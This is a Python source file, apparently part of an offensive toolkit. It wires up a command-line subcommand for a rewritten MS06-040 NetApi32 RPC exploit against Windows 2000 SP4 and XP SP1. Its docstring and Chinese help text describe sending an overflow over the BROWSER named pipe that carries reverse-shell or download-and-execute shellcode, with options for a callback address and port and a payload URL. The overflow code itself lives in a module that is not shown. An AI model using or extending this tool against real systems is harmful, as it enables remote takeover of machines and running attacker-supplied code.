"""rpc-exp — MS06-040 (NetApi32 NetpwPathCanonicalize) RPC exploit, v2 build.

Python rewrite of `ms06040rpc_unpacked_v2.exe`, the modified (v2) build of
the Mika MS06-040 RPC exploit recovered via IDA Pro + x32dbg memory dump.
Like the original, it binds the remote BROWSER RPC interface (this build
uses the 6a281939-0cb1-11d0-9ba8-00c04fd92ef5 / v0.0 abstract, fields stored
big-endian as printed) over the `\\<host>\\pipe\\BROWSER` named pipe and
fires a NetpwPathCanonicalize overflow request (opnum 0x1F) carrying a
reverse-shell or URL-download shellcode for Windows 2000 SP4 / XP SP1.
Transport is a raw byte-for-byte impacket-compatible stdlib SMBv1 client
(no impacket required).
"""

from . import rpc_exp


# ---------------------------------------------------------------------------
# Subcommand entrypoint.
# ---------------------------------------------------------------------------
def rpc_exp_handle(args):
    """Run the MS06-040 exploit against the supplied host."""
    return rpc_exp.run_function(
        host=args.host,
        mode="reverse" if args.rport is not None else "download",
        url=args.url,
        raddr=args.raddr,
        rport=args.rport,
        os_type=args.ostype,
        port=args.port,
        timeout=args.timeout,
    )


def reg_subparser(subparsers):
    """Register the `rpc-exp` subcommand on an argparse subparsers group."""
    p = subparsers.add_parser(
        "rpc-exp",
        help="MS06-040 (NetApi32 NetpwPathCanonicalize) RPC 利用 (v2 构建)",
        description="针对 ms06040rpc_unpacked_v2.exe（经 IDA Pro + x32dbg 内存转储恢复）"
                    "的 Python 重写。绑定 BROWSER RPC 接口（6a281939-0cb1-11d0-"
                    "9ba8-00c04fd92ef5 / v0.0，字段按打印序大端存储），通过远程 "
                    "\\\\<host>\\pipe\\BROWSER 命名管道发送 NetpwPathCanonicalize 溢出请求 "
                    "(opnum 0x1F)，携带反弹 shell (reverse) 或 URL 下载执行 (download) 的 "
                    "shellcode，针对 Win2000 SP4 / WinXP SP1。纯 stdlib（裸 SMBv1 客户端，"
                    "与 impacket 帧逐字节兼容），无需 impacket。",
    )
    p.add_argument(
        "host", metavar="HOST",
        help="目标主机名或 IP",
    )
    p.add_argument(
        "-u", "--url", metavar="URL",
        help="download 模式：让目标去下载并执行的 URL，如 http://x/test.exe",
    )
    p.add_argument(
        "-r", "--raddr", metavar="ADDR",
        help="reverse 模式：反弹连接的目标（本机）IP",
    )
    p.add_argument(
        "-p", "--rport", type=int, metavar="PORT",
        help="reverse 模式：反弹连接的监听端口",
    )
    p.add_argument(
        "-o", "--ostype", type=int, default=1,
        help="目标系统：1=Win2000 SP4（默认），2=WinXP SP1",
    )
    p.add_argument(
        "-P", "--port", type=int, default=rpc_exp.DEFAULT_PORT,
        help="目标 SMB 端口（默认 %d）" % rpc_exp.DEFAULT_PORT,
    )
    p.add_argument(
        "-t", "--timeout", type=float, default=rpc_exp.DEFAULT_TIMEOUT,
        help="连接/读取超时秒数（默认 %.1f）" % rpc_exp.DEFAULT_TIMEOUT,
    )
    p.set_defaults(func=rpc_exp_handle)
